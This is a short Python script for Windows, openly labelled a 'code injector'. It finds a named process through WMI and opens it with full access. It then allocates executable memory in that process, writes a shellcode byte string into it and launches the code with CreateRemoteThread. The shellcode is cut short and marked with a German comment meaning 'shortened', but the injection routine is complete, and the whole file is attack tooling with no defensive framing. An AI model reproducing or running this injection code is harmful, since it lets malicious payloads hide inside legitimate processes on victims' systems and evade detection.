import sys
from ctypes import *
from win32com.client import GetObject

if len(sys.argv) < 2:
    print("Python code injector: ./" + sys.argv[0] + " <process to inject>")
    sys.exit(0)

proc = sys.argv[1]
WMI = GetObject('winmgmts:')
p = WMI.ExecQuery('select * from Win32_Process where Name="%s"' % proc)
if len(p) == 0:
    print("Process " + proc + " not found, exiting!")
    sys.exit(0)

process_id = p[0].Properties_('ProcessId').Value

# Shellcode als Byte-String
shellcode = b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77..."  # gek√ºrzt

process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, process_id)
if not process_handle:
    print("Couldn't acquire a handle to PID: %s" % process_id)
    sys.exit(0)

memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x00001000, 0x40)
written = c_size_t(0)
windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, len(shellcode), byref(written))

if not windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0):
    print("Failed to inject shellcode. Exiting.")
    sys.exit(0)

print("Remote thread created!")